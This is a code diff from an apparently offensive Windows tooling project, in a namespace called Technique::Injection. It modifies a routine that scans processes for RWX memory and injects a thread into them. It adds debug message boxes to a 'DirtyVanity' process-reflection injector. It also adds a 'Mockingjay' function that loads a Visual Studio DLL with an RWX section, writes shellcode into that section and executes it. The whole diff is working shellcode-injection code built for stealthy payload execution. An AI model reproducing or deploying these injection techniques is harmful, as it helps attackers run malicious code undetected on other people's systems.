@@ -798,7 +798,7 @@ namespace Technique::Injection
         MEMORY_BASIC_INFORMATION m;
         BOOL bFound = FALSE;
 
-        while (bResult)
+        while (pProcs->lpProcess32NextW(hSnapshot, &pe))
         {
             hProcess = System::Process::ProcessOpen(
                 pProcs,
@@ -810,19 +810,6 @@ namespace Technique::Injection
                 // Check RWX
                 while (pProcs->lpVirtualQueryEx(hProcess, lpAddr, &m, sizeof(m)))
                 {
-                    // status = CallSysInvoke(
-                    //     &pProcs->sysNtQueryVirtualMemory,
-                    //     pProcs->lpNtQueryVirtualMemory,
-                    //     hProcess,
-                    //     lpAddr,
-                    //     MemoryBasicInformation,
-                    //     &m,
-                    //     sizeof(m),
-                    //     &dwReturnLength
-                    // );
-                    // if (status != STATUS_SUCCESS)
-                    //     continue;
-
                     lpAddr = (LPVOID)((DWORD_PTR)m.BaseAddress + m.RegionSize);
                     if (m.AllocationProtect == PAGE_EXECUTE_READWRITE)
                     {
@@ -845,7 +832,9 @@ namespace Technique::Injection
                             nullptr
                         );
                         if (!hThread)
+                        {
                             break;
+                        }
 
                         System::Handle::HandleWait(
                             pProcs,
@@ -854,19 +843,12 @@ namespace Technique::Injection
                             nullptr
                         );
 
-                        bFound = TRUE;
-
                         break;
                     }
                 }
 
                 lpAddr = nullptr;
             }
-
-            if (bFound)
-                break;
-            else
-                bResult = pProcs->lpProcess32NextW(hSnapshot, &pe);
         }
 
         System::Handle::HandleClose(pProcs, hSnapshot);
@@ -1137,6 +1119,8 @@ namespace Technique::Injection
         DWORD dwPID,
         const std::vector<BYTE>& bytes
     ) {
+        MessageBox(NULL, L"Start", L"DirtyVanity", MB_OK);
+
         LPVOID lpBuffer = (LPVOID)bytes.data();
         SIZE_T dwBufferSize = bytes.size();
 
@@ -1155,6 +1139,8 @@ namespace Technique::Injection
             return FALSE;
         }
 
+        MessageBox(NULL, L"Start", L"OpenProcess OK", MB_OK);
+
         LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
             pProcs,
             hProcess,
@@ -1169,6 +1155,8 @@ namespace Technique::Injection
             return FALSE;
         }
 
+        MessageBox(NULL, L"Start", L"VirtualMemoryAllocate", MB_OK);
+
         if (!System::Process::VirtualMemoryWrite(
             pProcs,
             hProcess,
@@ -1180,6 +1168,8 @@ namespace Technique::Injection
             System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
+
+        MessageBox(NULL, L"Start", L"VirtualMemoryWrite", MB_OK);
 
         Nt::RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
         NTSTATUS status = CallSysInvoke(
@@ -1198,8 +1188,70 @@ namespace Technique::Injection
             return FALSE;
         }
 
+        MessageBox(NULL, L"Start", L"CallSysInvoke OK", MB_OK);
+
         System::Handle::HandleWait(pProcs, hProcess, FALSE, nullptr);
         System::Handle::HandleClose(pProcs, hProcess);
+
+        return TRUE;
+    }
+
+    // Reference: https://github.com/caueb/Mockingjay/blob/main/MockingJay/MockingJay.c
+    BOOL ProcessMockingjay(
+        Procs::PPROCS pProcs,
+        const std::vector<BYTE>& bytes
+    ) {
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
+
+        // Target DLL with RWX permission
+        // TODO: Find more other vulnerable DLLs.
+        LPCWSTR lpTargetDll = L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll";
+        
+        HMODULE hDll = pProcs->lpLoadLibraryW(lpTargetDll);
+        if (!hDll)
+        {
+            return FALSE;
+        }
+
+        MODULEINFO mi;
+        if (!GetModuleInformation(NtCurrentProcess(), hDll, &mi, sizeof(MODULEINFO)))
+        {
+            return FALSE;
+        }
+
+        // Find RWX section offset & size
+        DWORD_PTR dwpRWXSecOffset = 0;
+        DWORD_PTR dwpRWXSecSize = 0;
+        PIMAGE_NT_HEADERS pNtHeaders = pProcs->lpImageNtHeader(hDll);
+        if (pNtHeaders)
+        {
+            PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+            for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+            {
+                if (
+                    (pSecHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                    (pSecHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
+                    (pSecHeader->Characteristics & IMAGE_SCN_MEM_READ)
+                ) {
+                    DWORD_PTR dwpBaseAddr = (DWORD_PTR)hDll;
+                    dwpRWXSecOffset = pSecHeader->VirtualAddress;
+                    dwpRWXSecSize = pSecHeader->SizeOfRawData;
+                }
+                pSecHeader++;
+            }
+        }
+        if (dwpRWXSecOffset == 0 || dwpRWXSecSize == 0)
+        {
+            return FALSE;
+        }
+
+        LPVOID lpRWXSection = (LPVOID)((PBYTE)mi.lpBaseOfDll + dwpRWXSecOffset);
+
+        // Write shellcode to section
+        memcpy(lpRWXSection, lpBuffer, dwBufferSize);
+        // Execute shellcode from section
+        ((void(*)())lpRWXSection)();
 
         return TRUE;
     }
